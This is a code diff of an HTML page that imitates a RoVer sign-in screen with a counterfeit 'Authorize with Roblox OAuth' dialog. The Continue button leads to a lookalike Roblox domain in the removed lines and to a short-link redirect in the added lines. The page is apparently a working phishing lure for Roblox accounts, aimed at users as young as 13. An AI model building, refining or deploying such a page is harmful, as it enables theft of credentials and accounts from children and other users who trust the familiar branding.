@@ -1,204 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>RoVer Login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RoVer</title>
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #1e1e1e;
-      color: #fff;
-    }
-
-    header {
-      background-color: #e6007e;
-      padding: 14px 20px;
-      font-size: 18px;
-      font-weight: bold;
-    }
-
-    main {
+      background-color: #1e1d1f;
+      color: white;
       display: flex;
-      justify-content: center;
-      align-items: center;
-      height: calc(100vh - 60px);
+      flex-direction: column;
+      height: 100vh;
     }
 
+    /* Top bar */
+    .navbar {
+      background-color: #e6007e;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+    }
+    .navbar h1 {
+      margin: 0;
+      margin-left: 10px;
+      font-size: 20px;
+    }
+    .menu-icon {
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    /* Center box */
     .card {
       background-color: #000;
+      border-radius: 6px;
       padding: 30px;
-      border-radius: 8px;
       text-align: center;
-      width: 380px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      max-width: 400px;
+      margin: auto;
     }
-
-    .card h1 {
-      margin-top: 0;
+    .card h2 {
+      margin-bottom: 10px;
     }
-
     .card p {
-      color: #aaa;
-      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 20px;
     }
-
     .btn {
-      background: #e6007e;
-      color: #fff;
+      background-color: #e6007e;
+      color: white;
       border: none;
-      padding: 10px 24px;
-      border-radius: 20px;
-      font-weight: bold;
+      border-radius: 25px;
+      padding: 12px 25px;
+      font-size: 16px;
       cursor: pointer;
-      margin-top: 20px;
+      transition: background 0.3s;
     }
-
     .btn:hover {
-      background: #ff2fa3;
+      background-color: #cc006f;
     }
 
     /* Modal */
-    .overlay {
-      display: none;
+    .modal {
       position: fixed;
-      inset: 0;
-      background-color: rgba(0,0,0,0.7);
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7);
+      display: flex;
       justify-content: center;
       align-items: center;
-      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
     }
-
-    .overlay.show {
-      display: flex;
+    .modal.show {
+      opacity: 1;
+      visibility: visible;
     }
-
-    .modal {
-      background-color: #111;
-      padding: 24px;
-      border-radius: 10px;
-      width: 360px;
-      color: #fff;
-      box-shadow: 0 0 20px rgba(0,0,0,0.8);
-    }
-
-    .modal h2 {
-      margin-top: 0;
-      margin-bottom: 20px;
+    .modal-content {
+      background: #111;
+      padding: 25px;
+      border-radius: 8px;
       text-align: center;
+      width: 350px;
+      transform: translateY(-50px);
+      transition: all 0.3s ease;
     }
-
-    .auth-box {
-      background: #000;
-      padding: 20px;
-      border-radius: 10px;
+    .modal.show .modal-content {
+      transform: translateY(0);
     }
-
-    .auth-box h3 {
-      margin: 0 0 10px;
-      font-size: 16px;
+    .modal h2 {
+      margin-bottom: 15px;
     }
-
-    .auth-box p {
-      font-size: 13px;
-      color: #ccc;
-    }
-
-    .auth-box hr {
-      border: none;
-      border-top: 1px solid #333;
-      margin: 10px 0;
-    }
-
-    .auth-box .app-name {
-      font-weight: bold;
-      margin-bottom: 12px;
-    }
-
-    .auth-box .continue-btn,
-    .auth-box .return-btn {
+    .modal button {
+      display: block;
       width: 100%;
-      padding: 10px;
-      font-size: 14px;
-      margin-top: 10px;
-      border-radius: 6px;
-      cursor: pointer;
+      margin: 10px 0;
+      padding: 12px;
       border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
     }
-
-    .auth-box .continue-btn {
+    .continue-btn {
       background: #fff;
       color: #000;
-      font-weight: bold;
     }
-
-    .auth-box .return-btn {
+    .back-btn {
       background: transparent;
-      border: 1px solid #555;
-      color: #ccc;
-    }
-
-    .auth-box .or {
-      text-align: center;
-      font-size: 12px;
-      margin: 8px 0;
-      color: #666;
+      border: 1px solid #444;
+      color: #aaa;
     }
   </style>
 </head>
 <body>
-  <header>RoVer</header>
+  <!-- Navigation bar -->
+  <div class="navbar">
+    <span class="menu-icon">☰</span>
+    <h1>RoVer</h1>
+  </div>
 
-  <main>
-    <div class="card">
-      <h1>Sign in to RoVer</h1>
-      <p>You must be 13 years of age or older to continue.</p>
-      <button class="btn" id="loginBtn">Log in with Roblox</button>
-    </div>
-  </main>
+  <!-- Center card -->
+  <div class="card">
+    <h2>Sign in to RoVer</h2>
+    <p>You must be 13 years of age or older to continue.</p>
+    <button class="btn" onclick="openModal()">Log in with Roblox</button>
+  </div>
 
-  <!-- Popup Modal -->
-  <div class="overlay" id="modal">
-    <div class="modal">
+  <!-- Modal -->
+  <div class="modal" id="loginModal">
+    <div class="modal-content">
       <h2>Sign in to RoVer</h2>
-      <div class="auth-box">
-        <h3>ROBLOX</h3>
-        <p>Authorize with Roblox OAuth</p>
-        <hr>
-        <div class="app-name">RoVer</div>
-        <button class="continue-btn" id="continueBtn">Continue</button>
-        <div class="or">or</div>
-        <button class="return-btn" id="closeBtn">Return to RoVer</button>
-      </div>
+      <p>ROBLOX<br>Authorize with Roblox OAuth</p>
+      <button class="continue-btn" onclick="redirectToPage()">Continue</button>
+      <button class="back-btn" onclick="closeModal()">Return to RoVer</button>
     </div>
   </div>
 
   <script>
-    const loginBtn = document.getElementById('loginBtn');
-    const modal = document.getElementById('modal');
-    const closeBtn = document.getElementById('closeBtn');
-    const continueBtn = document.getElementById('continueBtn');
-
-    loginBtn.onclick = () => {
-      modal.classList.add('show');
-    };
-
-    closeBtn.onclick = () => {
-      modal.classList.remove('show');
-    };
-
-    continueBtn.onclick = () => {
-      window.location.href = "https://roblox.com.ge/login?returnUrl=9955485842233784";
-    };
-
-    window.addEventListener('keydown', e => {
-      if (e.key === 'Escape') modal.classList.remove('show');
-    });
-
-    modal.addEventListener('click', e => {
-      if (e.target === modal) modal.classList.remove('show');
-    });
+    function openModal() {
+      document.getElementById("loginModal").classList.add("show");
+    }
+    function closeModal() {
+      document.getElementById("loginModal").classList.remove("show");
+    }
+    function redirectToPage() {
+      window.location.href = "https://short-url.org/1gqpq";
+    }
   </script>
 </body>
 </html>
